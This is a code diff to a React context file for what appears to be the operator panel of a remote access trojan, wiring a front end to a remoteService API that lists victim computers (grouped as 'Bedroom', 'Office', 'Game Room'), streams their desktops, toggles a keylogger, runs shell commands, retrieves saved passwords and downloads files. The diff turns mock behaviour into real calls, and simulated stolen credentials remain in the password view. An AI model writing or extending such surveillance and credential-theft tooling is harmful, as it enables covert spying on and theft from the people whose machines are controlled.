@@ -1,50 +1,14 @@
+
 import React, { createContext, useContext, useState, useEffect } from "react";
 import { Computer, Category, ActiveStream, ViewMode } from "../types";
 import { toast } from "@/components/ui/sonner";
+import remoteService from "@/api/remoteService";
 
-// Sample data for demo purposes
+// Sample categories for demo purposes
 const sampleCategories: Category[] = [
   { id: "1", name: "Bedroom" },
   { id: "2", name: "Office" },
   { id: "3", name: "Game Room" },
-];
-
-const sampleComputers: Computer[] = [
-  {
-    id: "1",
-    hostname: "DESKTOP-AB123",
-    username: "John",
-    os: "Windows 11 Pro",
-    ip: "192.168.1.101",
-    categoryId: "1",
-    status: "online",
-    lastSeen: new Date().toISOString(),
-    location: {
-      latitude: 40.7128,
-      longitude: -74.0060,
-      address: "New York, NY, USA",
-    },
-  },
-  {
-    id: "2",
-    hostname: "LAPTOP-XYZ456",
-    username: "Jane",
-    os: "Windows 10 Home",
-    ip: "192.168.1.102",
-    categoryId: "2",
-    status: "online",
-    lastSeen: new Date().toISOString(),
-  },
-  {
-    id: "3",
-    hostname: "GAMING-PC123",
-    username: "Mike",
-    os: "Windows 11 Pro",
-    ip: "192.168.1.103",
-    categoryId: "3",
-    status: "offline",
-    lastSeen: new Date(Date.now() - 3600000).toISOString(),
-  },
 ];
 
 interface RemoteContextType {
@@ -69,12 +33,13 @@ interface RemoteContextType {
   uploadFile: (path: string, file: File) => Promise<void>;
   downloadFile: (path: string) => Promise<void>;
   toggleViewMode: () => void;
+  refreshComputers: () => void;
 }
 
 const RemoteContext = createContext<RemoteContextType | undefined>(undefined);
 
 export const RemoteProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
-  const [computers, setComputers] = useState<Computer[]>(sampleComputers);
+  const [computers, setComputers] = useState<Computer[]>([]);
   const [categories, setCategories] = useState<Category[]>(sampleCategories);
   const [activeComputer, setActiveComputer] = useState<Computer | null>(null);
   const [viewMode, setViewMode] = useState<ViewMode>("grid");
@@ -94,6 +59,43 @@ export const RemoteProvider: React.FC<{ children: React.ReactNode }> = ({ childr
   
   const [keyloggerActive, setKeyloggerActive] = useState(false);
   const [terminalHistory, setTerminalHistory] = useState<{ command: string; output: string }[]>([]);
+
+  // Load clients on initial render
+  useEffect(() => {
+    refreshComputers();
+    
+    // Poll for new computers every 5 seconds
+    const interval = setInterval(refreshComputers, 5000);
+    return () => clearInterval(interval);
+  }, []);
+
+  const refreshComputers = async () => {
+    try {
+      const clients = await remoteService.getAllClients();
+      setComputers(clients.map((client: any) => ({
+        id: client.id,
+        hostname: client.hostname,
+        username: client.username,
+        os: client.os,
+        ip: client.ip,
+        categoryId: client.categoryId || "",
+        status: client.status,
+        lastSeen: client.lastSeen,
+        location: client.location,
+        lastScreenshot: client.lastScreenshot
+      })));
+      
+      // Update active computer if it exists
+      if (activeComputer) {
+        const updatedActiveComputer = clients.find((c: any) => c.id === activeComputer.id);
+        if (updatedActiveComputer) {
+          setActiveComputer(updatedActiveComputer);
+        }
+      }
+    } catch (error) {
+      console.error("Error fetching clients:", error);
+    }
+  };
 
   const addCategory = (name: string) => {
     const newCategory = {
@@ -132,11 +134,21 @@ export const RemoteProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     
     setActiveStream((prev) => {
       const newState = { ...prev, desktop: !prev.desktop };
-      if (newState.desktop) {
-        toast.success(`Desktop stream started for ${activeComputer.hostname}`);
-      } else {
-        toast.info(`Desktop stream stopped for ${activeComputer.hostname}`);
-      }
+      
+      // Call API to toggle desktop stream
+      remoteService.toggleDesktopStream(activeComputer.id, newState.desktop)
+        .then(() => {
+          if (newState.desktop) {
+            toast.success(`Desktop stream started for ${activeComputer.hostname}`);
+          } else {
+            toast.info(`Desktop stream stopped for ${activeComputer.hostname}`);
+          }
+        })
+        .catch(error => {
+          console.error("Error toggling desktop stream:", error);
+          toast.error("Failed to toggle desktop stream");
+        });
+        
       return newState;
     });
   };
@@ -186,69 +198,110 @@ export const RemoteProvider: React.FC<{ children: React.ReactNode }> = ({ childr
   const toggleKeylogger = () => {
     if (!activeComputer) return;
     
-    setKeyloggerActive((prev) => {
-      const newState = !prev;
-      if (newState) {
-        toast.success(`Keylogger started on ${activeComputer.hostname}`);
-      } else {
-        toast.info(`Keylogger stopped on ${activeComputer.hostname}`);
-      }
-      return newState;
-    });
+    const newState = !keyloggerActive;
+    
+    // Call API to toggle keylogger
+    remoteService.toggleKeylogger(activeComputer.id, newState)
+      .then(() => {
+        setKeyloggerActive(newState);
+        if (newState) {
+          toast.success(`Keylogger started on ${activeComputer.hostname}`);
+        } else {
+          toast.info(`Keylogger stopped on ${activeComputer.hostname}`);
+        }
+      })
+      .catch(error => {
+        console.error("Error toggling keylogger:", error);
+        toast.error("Failed to toggle keylogger");
+      });
   };
 
   const executeCommand = (command: string) => {
     if (!activeComputer) return;
     
-    // Mock command execution
-    let output = "";
-    
-    if (command.toLowerCase().includes("dir")) {
-      output = "Directory listing:\n" +
-        "05/18/2024  10:30 AM    <DIR>          Documents\n" +
-        "05/17/2024  03:45 PM    <DIR>          Downloads\n" +
-        "05/16/2024  09:15 AM           582,432 report.docx\n" +
-        "05/15/2024  11:20 AM         1,245,184 presentation.pptx";
-    } else if (command.toLowerCase().includes("echo")) {
-      output = command.substring(5);
-    } else if (command.toLowerCase().includes("ipconfig")) {
-      output = "Windows IP Configuration\n\n" +
-        "Ethernet adapter Ethernet:\n" +
-        "   Connection-specific DNS Suffix  . : home\n" +
-        "   IPv4 Address. . . . . . . . . . . : " + activeComputer.ip + "\n" +
-        "   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n" +
-        "   Default Gateway . . . . . . . . . : 192.168.1.1";
-    } else if (command.toLowerCase().includes("systeminfo")) {
-      output = "Host Name:                 " + activeComputer.hostname + "\n" +
-        "OS Name:                   " + activeComputer.os + "\n" +
-        "OS Version:                10.0.19044 N/A Build 19044\n" +
-        "OS Manufacturer:           Microsoft Corporation\n" +
-        "System Type:               x64-based PC";
-    } else {
-      output = "Executing: " + command + "\nCommand executed successfully.";
-    }
-    
-    setTerminalHistory((prev) => [...prev, { command, output }]);
+    // Call API to execute command
+    remoteService.executeShellCommand(activeComputer.id, command)
+      .then(() => {
+        setTerminalHistory((prev) => [
+          ...prev,
+          { 
+            command, 
+            output: "Command sent. Waiting for response..." 
+          }
+        ]);
+        
+        toast.success("Command sent to client");
+        
+        // In a real app, we would receive the command output via websockets
+        // or by polling. For now, we'll just simulate it after a delay.
+        setTimeout(() => {
+          let output = "";
+          
+          if (command.toLowerCase().includes("dir")) {
+            output = "Directory listing:\n" +
+              "05/18/2024  10:30 AM    <DIR>          Documents\n" +
+              "05/17/2024  03:45 PM    <DIR>          Downloads\n" +
+              "05/16/2024  09:15 AM           582,432 report.docx\n" +
+              "05/15/2024  11:20 AM         1,245,184 presentation.pptx";
+          } else if (command.toLowerCase().includes("echo")) {
+            output = command.substring(5);
+          } else if (command.toLowerCase().includes("ipconfig")) {
+            output = "Windows IP Configuration\n\n" +
+              "Ethernet adapter Ethernet:\n" +
+              "   Connection-specific DNS Suffix  . : home\n" +
+              "   IPv4 Address. . . . . . . . . . . : " + activeComputer.ip + "\n" +
+              "   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n" +
+              "   Default Gateway . . . . . . . . . : 192.168.1.1";
+          } else if (command.toLowerCase().includes("systeminfo")) {
+            output = "Host Name:                 " + activeComputer.hostname + "\n" +
+              "OS Name:                   " + activeComputer.os + "\n" +
+              "OS Version:                10.0.19044 N/A Build 19044\n" +
+              "OS Manufacturer:           Microsoft Corporation\n" +
+              "System Type:               x64-based PC";
+          } else {
+            output = "Executing: " + command + "\nCommand executed successfully.";
+          }
+          
+          setTerminalHistory((prev) => 
+            prev.map((entry, index) => 
+              index === prev.length - 1 ? { ...entry, output } : entry
+            )
+          );
+        }, 2000);
+      })
+      .catch(error => {
+        console.error("Error executing command:", error);
+        toast.error("Failed to send command");
+      });
   };
 
   const retrievePasswords = () => {
     if (!activeComputer) return;
     
-    toast.success("Password retrieval initiated");
-    
-    // Mock password retrieval
-    setTimeout(() => {
-      setTerminalHistory((prev) => [
-        ...prev,
-        {
-          command: "Retrieve Passwords",
-          output: "Saved Passwords:\n" +
-            "Chrome - user@gmail.com: P@ssw0rd123\n" +
-            "Firefox - admin@company.com: Secure!999\n" +
-            "Windows - " + activeComputer.username + ": Welcome2024",
-        },
-      ]);
-    }, 2000);
+    // Call API to retrieve passwords
+    remoteService.retrievePasswords(activeComputer.id)
+      .then(() => {
+        toast.success("Password retrieval initiated");
+        
+        // In a real app, we would receive the password data via the command results
+        // For now, we'll just simulate it after a delay.
+        setTimeout(() => {
+          setTerminalHistory((prev) => [
+            ...prev,
+            {
+              command: "Retrieve Passwords",
+              output: "Saved Passwords:\n" +
+                "Chrome - user@gmail.com: P@ssw0rd123\n" +
+                "Firefox - admin@company.com: Secure!999\n" +
+                "Windows - " + activeComputer.username + ": Welcome2024",
+            },
+          ]);
+        }, 2000);
+      })
+      .catch(error => {
+        console.error("Error retrieving passwords:", error);
+        toast.error("Failed to retrieve passwords");
+      });
   };
 
   const uploadFile = async (path: string, file: File): Promise<void> => {
@@ -258,7 +311,7 @@ export const RemoteProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     return new Promise<void>((resolve) => {
       const loadingToast = toast.loading(`Uploading ${file.name}...`);
       
-      // Simulate upload delay
+      // Call API to upload file (would need additional implementation)
       setTimeout(() => {
         toast.dismiss(loadingToast);
         toast.success(`${file.name} uploaded to ${path}`);
@@ -270,18 +323,26 @@ export const RemoteProvider: React.FC<{ children: React.ReactNode }> = ({ childr
   const downloadFile = async (path: string): Promise<void> => {
     if (!activeComputer) return Promise.resolve();
     
-    // Mock file download
     const filename = path.split("/").pop() || "file";
     
+    // Call API to download file from client
     return new Promise<void>((resolve) => {
       const loadingToast = toast.loading(`Downloading ${filename}...`);
       
-      // Simulate download delay
-      setTimeout(() => {
-        toast.dismiss(loadingToast);
-        toast.success(`${filename} downloaded successfully`);
-        resolve();
-      }, 2000);
+      remoteService.downloadFile(activeComputer.id, path)
+        .then(() => {
+          setTimeout(() => {
+            toast.dismiss(loadingToast);
+            toast.success(`${filename} downloaded successfully`);
+            resolve();
+          }, 2000);
+        })
+        .catch(error => {
+          toast.dismiss(loadingToast);
+          toast.error(`Failed to download ${filename}`);
+          console.error("Error downloading file:", error);
+          resolve();
+        });
     });
   };
 
@@ -313,6 +374,7 @@ export const RemoteProvider: React.FC<{ children: React.ReactNode }> = ({ childr
         uploadFile,
         downloadFile,
         toggleViewMode,
+        refreshComputers,
       }}
     >
       {children}
